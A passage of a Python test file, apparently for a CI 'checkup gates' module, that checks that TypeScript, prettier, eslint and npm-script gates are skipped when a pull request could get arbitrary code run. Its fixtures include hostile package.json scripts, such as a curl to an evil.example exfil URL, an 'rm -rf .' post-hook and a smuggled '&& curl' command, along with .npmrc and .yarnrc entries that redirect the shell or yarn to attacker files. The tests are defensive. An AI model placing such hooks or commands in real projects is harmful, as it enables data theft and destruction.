        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc --noEmit"},
            }),
            encoding="utf-8",
        )
        # Package-name extends — the gate must skip because we
        # cannot read what the resolved config says.
        (tmp_path / "tsconfig.json").write_text(
            '{"extends": "@demo/tsconfig"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_npm_tsc_script_gate_skipped_when_extends_chain_signals_incremental(
        self, tmp_path: Path
    ) -> None:
        """Iter-29 Finding 1: a top-level ``tsconfig.json`` with no
        ``incremental``/``composite`` field but ``extends:
        ./tsconfig.base.json`` where the base sets
        ``incremental: true`` still emits ``tsconfig.tsbuildinfo``
        when ``npm run typecheck`` runs. The script gate must walk
        the extends chain to detect that.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.base.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"extends": "./tsconfig.base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_tsc_gate_skipped_when_pr_touches_local_tsc_binary(
        self, tmp_path: Path
    ) -> None:
        """Iter-29 Finding 3: the direct tsc-noemit gate trusts
        ``node_modules/typescript/bin/tsc`` to be operator-supplied,
        but a fork PR can ADD or MODIFY that path (the file is
        nominally part of installed dependencies, but the PR file
        list is the source of truth). Skip when the PR diff
        contains anything under ``node_modules/typescript/`` or
        ``node_modules/.bin/tsc``.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        for changed in (
            ("node_modules/typescript/bin/tsc",),
            ("node_modules/typescript/package.json",),
            ("node_modules/.bin/tsc",),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            assert "tsc-noemit" not in {g.name for g in gates}, (
                f"direct tsc gate must skip when PR touches: {changed}"
            )

    def test_npm_tsc_script_gate_skipped_when_tsconfig_signals_incremental_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 1: a script-based tsc gate (e.g.
        ``"typecheck": "tsc --noEmit"``) runs the operator's
        unmodified argv. When tsconfig has ``incremental: true`` even
        the noEmit form writes ``tsconfig.tsbuildinfo`` into the
        worktree. The script gate cannot inject ``--incremental
        false`` like the direct gate can, so we MUST skip discovery
        on those repos."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_npm_tsc_script_gate_skipped_when_tsconfig_signals_composite(
        self, tmp_path: Path
    ) -> None:
        """Same as above for ``composite: true`` (which conflicts
        with --noEmit AND writes buildinfo)."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_tsc_direct_gate_passes_composite_false(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 2: ``composite: true`` set via the
        tsconfig extends chain only surfaces at compile time. The
        argv MUST pass ``--composite false`` to override regardless
        of what the resolved tsconfig says, so the gate doesn't
        produce a false TS6379 blocker on project-reference repos."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        # tsconfig itself does NOT enable composite — the extends
        # chain is what would trip TS6379. The argv defense fires
        # regardless of the top-level value.
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        assert "--composite" in cmd, cmd
        idx = cmd.index("--composite")
        assert cmd[idx + 1] == "false", cmd

    def test_prettier_script_gate_skipped_when_pr_changes_plugin_module(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 3: an unchanged ``prettier.config.cjs``
        can ``require('./local-plugin.cjs')`` — a PR that only
        modifies the plugin module still achieves RCE through the
        prettier gate. The iter-27 config-filename skip misses it.
        Widen the skip to ANY PR-modified ``.cjs``/``.mjs`` file
        plus any ``.js`` at the repo root (the common locations
        for tooling/plugin code).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR ONLY touched a plugin module loaded transitively.
        gates = discover_gates(
            tmp_path, changed_files=("local-plugin.cjs",)
        )
        names = [g.name for g in gates]
        assert "npm:format:check" not in names
        # ``.mjs`` plugin module same.
        gates = discover_gates(
            tmp_path, changed_files=("plugins/foo.mjs",)
        )
        assert "npm:format:check" not in [g.name for g in gates]
        # ``.js`` at the repo root (common for ``prettier.config.js``
        # plugin imports) same.
        gates = discover_gates(
            tmp_path, changed_files=("plugin.js",)
        )
        assert "npm:format:check" not in [g.name for g in gates]

    def test_prettier_script_gate_skipped_on_any_js_change(
        self, tmp_path: Path
    ) -> None:
        """Iter-29 Finding 2 (revises iter-28 behaviour). Prettier
        configs ``require()`` arbitrary local JavaScript — including
        files in subdirectories like ``./src/plugin.js``. The
        iter-28 ``allow subdir .js`` heuristic was too lax: a
        stable ``prettier.config.cjs`` pulling in PR-modified
        ``./src/plugin.js`` still RCEs. The safer contract is to
        skip the prettier/eslint script gate whenever ANY ``.js`` /
        ``.cjs`` / ``.mjs`` file changed in the PR — we cannot
        statically follow the require chain.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # Subdirectory .js — iter-28 let this through; iter-29
        # skips it.
        for changed in (
            ("src/app.js",),
            ("src/components/foo.js",),
            ("packages/x/src/y.js",),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            assert "npm:format:check" not in {g.name for g in gates}, (
                f"prettier script gate must skip on JS change: {changed}"
            )

    def test_prettier_script_gate_still_fires_on_non_js_pr(
        self, tmp_path: Path
    ) -> None:
        """Inverse of the above: a PR that touches only non-JS
        files (markdown, YAML, Python) still gets the gate."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path,
            changed_files=("README.md", "docs/guide.md", "pkg/foo.py"),
        )
        assert "npm:format:check" in {g.name for g in gates}

    def test_tsc_noemit_substring_bypass_rejected(self) -> None:
        """Iter-27 Finding 2: ``tsc --noEmitOnError`` is a DIFFERENT
        TypeScript flag that does NOT suppress emit; the prior
        substring match (``"--noemit" not in stripped``) would have
        accepted it. ``tsc --noEmit false`` likewise emits.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc --noEmitOnError",
            "tsc --noEmitOnError -p tsconfig.json",
            "tsc --noEmit false",
            "tsc --noEmit no",
            "tsc -p tsconfig.json --noEmitOnError",
            "tsc -p tsconfig.json --noEmit false",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"emitting payload must be rejected: {payload!r}"
            )
        # Sanity: the explicit ``--noEmit true`` and bare ``--noEmit``
        # are both accepted.
        assert _script_is_acceptable("tsc --noEmit") is True
        assert _script_is_acceptable("tsc --noEmit true") is True
        assert _script_is_acceptable("tsc --noEmit --incremental false") is True

    def test_tsc_direct_gate_passes_incremental_false_and_redirects_buildinfo(
        self, tmp_path: Path
    ) -> None:
        """Iter-27 Finding 1: even ``tsc --noEmit`` writes
        ``tsconfig.tsbuildinfo`` when ``incremental: true`` is set
        in tsconfig. The direct tsc-noemit gate MUST pass
        ``--incremental false`` and ``--tsBuildInfoFile /dev/null``
        so the gate cannot dirty the worktree.
        """
        import os
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        # The argv MUST contain both safeguards.
        assert "--incremental" in cmd and "false" in cmd, cmd
        assert "--tsBuildInfoFile" in cmd, cmd
        # ``--tsBuildInfoFile`` MUST point at devnull (or another
        # path that cannot be staged into the worktree).
        idx = cmd.index("--tsBuildInfoFile")
        assert cmd[idx + 1] == os.devnull, cmd

    def test_tsc_direct_gate_emits_with_composite_false_even_on_composite_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-28 Finding 2 replaces iter-27's top-level composite
        skip. The argv now passes ``--composite false`` to override
        whatever the tsconfig (or its extends chain) says, so the
        gate STILL emits — and the tsc invocation no longer hits
        TS6379. The top-level skip is removed because it only
        covered top-level composite, while extends-chain composite
        was still a false-blocker hazard."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # ``npx`` not on PATH in sandbox
            return
        cmd = tsc_gates[0].cmd
        # The argv carries the composite override; top-level
        # composite must NOT cause discovery to skip.
        idx = cmd.index("--composite")
        assert cmd[idx + 1] == "false", cmd

    def test_npm_gate_skipped_when_pr_modified_prettier_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-27 Finding 3: prettier loads ``prettier.config.{js,cjs,mjs}``
        (and ``.prettierrc.{js,cjs,mjs,ts}``) and executes it as
        JavaScript. A fork PR that ships a poisoned config can
        achieve RCE through the gate. Skip the gate when the PR
        modified any prettier config file.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR-modified prettier config in the changed-file inventory.
        gates = discover_gates(
            tmp_path, changed_files=("prettier.config.cjs",)
        )
        names = [g.name for g in gates]
        assert "npm:format:check" not in names
        # Sanity: when the PR did NOT touch the config the gate
        # still fires (this is the existing safe path).
        gates2 = discover_gates(tmp_path, changed_files=("src/a.ts",))
        assert "npm:format:check" in [g.name for g in gates2]

    def test_tsc_direct_gate_skipped_when_pr_modified_tsconfig(
        self, tmp_path: Path
    ) -> None:
        """Same as above but for the direct tsc-noemit path:
        ``tsconfig.json`` carries ``compilerOptions.paths`` /
        ``plugins`` / transformer references that tsc will load.
        Skip when the PR modified it."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}\n", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(
            tmp_path, changed_files=("tsconfig.json",)
        )
        assert "tsc-noemit" not in {g.name for g in gates}

    def test_script_rejects_tsc_p_without_noemit(self) -> None:
        """Iter-26 Finding 1: ``tsc -p <project>`` without ``--noEmit``
        writes .js / .d.ts / .tsbuildinfo files to the worktree. The
        head match alone is not enough — require ``--noEmit`` in the
        argv before accepting.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc -p tsconfig.json",
            "tsc -p .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"tsc -p without --noEmit must be rejected: {payload!r}"
            )
        # The safe forms still pass.
        assert _script_is_acceptable("tsc --noEmit") is True
        assert _script_is_acceptable("tsc --noEmit -p tsconfig.json") is True
        assert _script_is_acceptable("tsc -p tsconfig.json --noEmit") is True

    def test_script_rejects_eslint_without_no_fix(self) -> None:
        """Iter-26 Finding 2: bare ``eslint .`` is rejected — ESLint
        config files can enable fix mode silently via
        ``"fix": true``. Require explicit ``--no-fix`` opt-out.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "eslint .",
            "eslint src/",
            "eslint --max-warnings 0 .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"eslint without --no-fix must be rejected: {payload!r}"
            )
        assert _script_is_acceptable("eslint --no-fix .") is True

    def test_script_rejects_cache_flag(self) -> None:
        """Iter-26 Finding 2: ``--cache`` writes a worktree-resident
        cache file (``.eslintcache`` / ``.prettiercache``). Gates
        must be non-mutating, so any ``--cache`` flag is rejected.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "eslint --no-fix --cache .",
            "prettier --check --cache .",
            "npx --no-install eslint --no-fix --cache .",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"--cache payload must be rejected: {payload!r}"
            )

    def test_script_rejects_bare_npx_prefix(self) -> None:
        """Iter-22 Finding 2: ``npm run <script>`` lets the script body
        execute. A script body of ``npx tsc --noEmit`` or
        ``npx prettier --check .`` would let `npx` reach the npm
        registry and install/exec the tool when it is not in local
        ``node_modules`` — the same network-install hole the
        tsconfig-discovery path closes with ``--no-install``.
        ``_script_is_acceptable`` MUST reject bare ``npx`` prefixes.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npx tsc --noEmit",
            "npx prettier --check .",
            "npx prettier --check src/**/*.ts",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"bare npx payload {payload!r} must be rejected"
            )

    def test_script_accepts_npx_with_no_install(self) -> None:
        """Iter-22 Finding 2 inverse: an explicit ``npx --no-install``
        invocation is the documented safe form (operators opt into
        the gate without the registry-install fallback)."""
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npx --no-install tsc --noEmit",
            "npx --no-install prettier --check .",
        ):
            assert _script_is_acceptable(payload) is True, (
                f"safe npx payload {payload!r} must be accepted"
            )

    def test_discover_skips_npm_script_with_bare_npx_prefix(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` that smuggles in
        bare ``npx tsc`` via a recognised script name must NOT emit a
        gate; the npm-run path would otherwise reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"typecheck": "npx tsc --noEmit"}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_script_accepts_legitimate_prettier_with_glob(self) -> None:
        """Positive sanity: a real prettier invocation with a glob and
        space-separated args must STILL be accepted — the metachar guard
        cannot be so wide it breaks normal scripts."""
        from pdd.checkup_gates import _script_is_acceptable

        assert _script_is_acceptable("prettier --check src/**/*.ts") is True
        assert _script_is_acceptable("prettier --check '.'") is True
        assert _script_is_acceptable(
            "prettier --check src/foo.ts src/bar.ts"
        ) is True
        assert _script_is_acceptable("tsc --noEmit") is True

    def test_discover_skips_npm_script_with_shell_metachars(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` must NOT emit a gate."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {"format:check": "prettier --check && curl http://evil.example/"}
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_pre_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 2: a benign script must NOT be invoked when
        ``pre<name>``/``post<name>`` lifecycle hooks would also execute.
        npm/yarn/pnpm/bun fire those hooks around ``<runner> run <name>``,
        and discovery only validates the named script — so a malicious
        ``preformat:check`` would smuggle ``curl`` past the allowlist.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "format:check": "prettier --check .",
                    "preformat:check": "curl http://evil.example/exfil",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_post_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "typecheck": "tsc --noEmit",
                    "posttypecheck": "rm -rf .",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_git_diff_check_uses_pr_range_when_base_ref_resolvable(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 1: a committed whitespace failure on the PR
        branch must be caught even when the worktree is clean. The gate
        must run ``git diff --check <base>...HEAD``, not the plain
        ``git diff --check`` against unstaged worktree changes.
        """
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "feat", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref="main")
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert diff_gate.cmd == ["git", "diff", "--check", "main...HEAD"]

    def test_git_diff_check_falls_back_when_base_ref_unresolvable(
        self, tmp_path: Path
    ) -> None:
        """When no base ref verifies AND no ``main``/``master`` exists
        in the worktree (synthetic test repo on a feature branch with
        no remote), we keep the existing plain ``git diff --check`` so
        single-commit smoke tests still see a gate."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(
            ["git", "init", "-q", "-b", "feature-only"], cwd=tmp_path, check=True
        )
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(
            tmp_path,
            changed_files=(),
            base_ref="branch-that-does-not-exist",
        )
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert diff_gate.cmd == ["git", "diff", "--check"]

    def test_git_diff_check_falls_back_to_main_master_when_no_base_ref(
        self, tmp_path: Path
    ) -> None:
        """When no ``base_ref`` is supplied but a local ``main``/``master``
        exists (the default for ``git init``), discovery still uses it
        so the PR-range guarantee holds even when the caller forgot to
        thread ``pr_metadata['base_ref']`` through. This preserves the
        product invariant from issue #1092: a committed whitespace
        failure must be caught."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # Either ``master...HEAD`` or ``main...HEAD`` depending on the
        # local ``init.defaultBranch`` — both satisfy the contract.
        assert diff_gate.cmd[:3] == ["git", "diff", "--check"]
        if len(diff_gate.cmd) > 3:
            assert diff_gate.cmd[3].endswith("...HEAD")

    def test_git_diff_check_accepts_fully_qualified_local_ref(
        self, tmp_path: Path
    ) -> None:
        """Iter-17 Finding 2: ``_refresh_pr_base_ref`` lands the PR base
        into ``refs/remotes/pdd-checkup/pr-<N>/base`` so it cannot
        collide with the operator's own ``origin`` tracking refs. The
        gate resolver MUST accept that fully-qualified ref directly
        (instead of trying ``origin/refs/...`` and falling through to
        the generic candidate set, which would silently drop the PR
        range)."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        # Manufacture the dedicated tracking ref that
        # ``_refresh_pr_base_ref`` would produce in production.
        local_ref = "refs/remotes/pdd-checkup/pr-1/base"
        subprocess.run(
            ["git", "update-ref", local_ref, "HEAD"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "feat", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref=local_ref)
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # The gate must run against the dedicated ref directly, not
        # ``origin/refs/...`` or a fallback like ``main...HEAD``.
        assert diff_gate.cmd == ["git", "diff", "--check", f"{local_ref}...HEAD"]

    def test_tsc_noemit_skipped_when_node_modules_typescript_absent(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3: tsc-noemit must NOT fire ``npx tsc`` when
        TypeScript isn't actually installed locally. Bare ``npx tsc``
        falls back to a registry download + install + exec when the
        local binary is missing, which violates the deterministic-local
        contract from issue #1092. Discovery must skip the gate in that
        case so the gate runner never gets a chance to network-install.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        # NOTE: no ``node_modules/typescript/bin/tsc`` on disk.
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "tsc-noemit" not in names

    def test_tsc_noemit_emitted_with_no_install_flag_when_locally_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3 inverse: once TypeScript IS installed
        locally, the gate fires — and it must pass ``--no-install`` so
        a future npx rewire still cannot reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        if "tsc-noemit" in names:  # only when ``npx`` is on PATH
            gate = next(g for g in gates if g.name == "tsc-noemit")
            assert "--no-install" in gate.cmd

    # ------------------------------------------------------------------
    # Iter-38 Finding 1: package-manager config can redirect script
    # execution to a PR-controlled binary.
    # ------------------------------------------------------------------

    def test_npm_gates_skip_when_npmrc_sets_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: ``.npmrc``'s ``script-shell`` key lets a PR
        redirect ``npm run`` (and ``npx``) to a PR-controlled shell
        binary. Confirmed against npm 10.x: writing
        ``script-shell=./evil-sh`` plus ``./evil-sh`` makes
        ``npm run format:check`` execute ``./evil-sh -c "prettier
        --check ."`` before the allowlisted argv even runs. The entire
        npm gate path must short-circuit when this config is present.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".npmrc").write_text(
            "script-shell=./evil-sh\n", encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_pnpmrc_sets_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: pnpm reads ``.pnpmrc`` (in addition to
        ``.npmrc``) and honours ``script-shell``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '6.0'\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".pnpmrc").write_text(
            "script-shell=./evil-sh\n", encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarnrc_sets_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 1's ``.yarnrc`` honours
        ``script-shell``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".yarnrc").write_text(
            'script-shell "./evil-sh"\n', encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarnrc_sets_yarn_path(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 1's ``yarn-path`` redirects the yarn
        binary itself to a PR-controlled JavaScript file."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".yarnrc").write_text(
            'yarn-path "./evil-yarn.cjs"\n', encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarnrc_yml_sets_yarn_path(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 2+'s ``.yarnrc.yml`` ``yarnPath`` key
        redirects yarn boot to a PR-controlled ``.cjs`` runtime."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".yarnrc.yml").write_text(
            'yarnPath: "./.yarn/releases/yarn-evil.cjs"\n', encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarn_releases_directory_exists(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 2+ boots from ``.yarn/releases/yarn-*.cjs``.
        The file is PR-controllable and runs JS at every yarn invocation."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        releases = tmp_path / ".yarn" / "releases"
        releases.mkdir(parents=True)
